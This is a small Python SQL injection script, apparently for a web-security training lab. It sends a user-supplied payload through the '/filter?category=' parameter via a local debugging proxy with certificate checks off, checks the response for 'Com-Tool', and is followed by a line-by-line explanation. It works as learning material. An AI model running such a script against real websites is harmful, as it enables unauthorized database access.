import requests # type: ignore
import sys 
import urllib3 # type: ignore
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} # help to debug scripts

def exploit_sqli(url,payload):
    uri = "/filter?category="
    r = requests.get(url + uri + payload, verify =False,proxies=proxies)
    if "Com-Tool" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()


    except IndexError:
        print("[-]usuage : %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.wxample.com "1=1" ' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url,payload):
        print("[+] SQL Injection Successful")
    else:
        print("[+] SQL Injection Failed")


#Explanation of the code

#The provided code is a Python script that performs a SQL injection exploit on a given URL with a specified payload.

#1. The script first imports necessary libraries:
#  - `requests`: This library is used to send HTTP requests to the specified URL.
#  - `sys`: This module provides access to some variables used or maintained by the interpreter and to functions that interact with the interpreter.
#  - `urllib3`: This library is used to disable insecure request warnings.

#2. The script then disables insecure request warnings using `urllib3` to suppress any warnings related to insecure requests.

#3. It defines a dictionary named `proxies` that contains proxy settings for debugging scripts. The proxies are set for both HTTP and HTTPS connections to `http://127.0.0.1:8080`.
#4. The `exploit_sqli` function is defined with two parameters:
#   - `url`: Represents the base URL where the SQL injection exploit will be performed.
#  - `payload`: Represents the SQL injection payload to be injected into the URL.

#5. Inside the `exploit_sqli` function:
#   - It constructs the complete URI by appending the `/filter?category=` with the provided payload.
#   - It then sends a GET request to the constructed URL using `requests.get` with the specified parameters:
#     - `verify=False`: Disables SSL certificate verification.
#     - `proxies=proxies`: Uses the defined proxy settings for the request.
#   - If the response text contains the string "Com-Tool", the function returns `True`, indicating a successful SQL injection.
#  - Otherwise, it returns `False`.

#6. The script checks if it is being run as the main program using `if __name__ == "__main__":`.

#7. Inside the main block:
#   - It tries to extract the URL and payload from the command-line arguments provided when running the script.
#   - If the required arguments are not provided, it prints a usage message and exits the script.
#   - It then calls the `exploit_sqli` function with the extracted URL and payload.
#  - Based on the return value of the function, it prints either "[+] SQL Injection Successful" or "[+] SQL Injection Failed" to indicate the success or failure of the SQL injection exploit